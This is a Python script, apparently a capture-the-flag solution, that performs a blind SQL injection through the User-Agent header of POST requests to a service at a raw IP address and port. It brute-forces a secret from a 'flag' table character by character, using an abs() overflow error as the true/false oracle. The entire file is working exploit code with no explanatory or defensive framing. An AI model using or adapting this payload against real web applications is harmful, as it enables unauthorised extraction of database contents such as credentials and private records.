import requests

charset = 'abcdefghijklmnopqrstuvwxyz.0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()}{ ,'
url = "http://103.97.125.56:31047"

def find_flag(url):
    flag = ""
    for index in range(1, 100):
        found_char = False
        for c in charset:
            headers = {
                'User-Agent': f"', (SELECT CASE WHEN substr((SELECT secret FROM flag LIMIT 1), {index}, 1) = '{c}' THEN 1 ELSE abs(-9223372036854775808) END), null, null, null),(null,'"
            }
            print(f"Testing index {index}, char: {c}", end="\r")

            try:
                response = requests.post(url, headers=headers)
                response.raise_for_status()

                if "Logged" in response.text:
                    flag += c
                    found_char = True
                    print(f"\nFound char: {c}, Flag: {flag}")
                    break

            except requests.exceptions.RequestException as e:
                print(f"\nRequest Error: {e}")
                return None

        if not found_char:
            break

    return flag


flag = find_flag(url)
print("\n[✅] Flag: ", flag)
print("\n[❕] Finished!!!!!")
input("Press Enter to exit...")
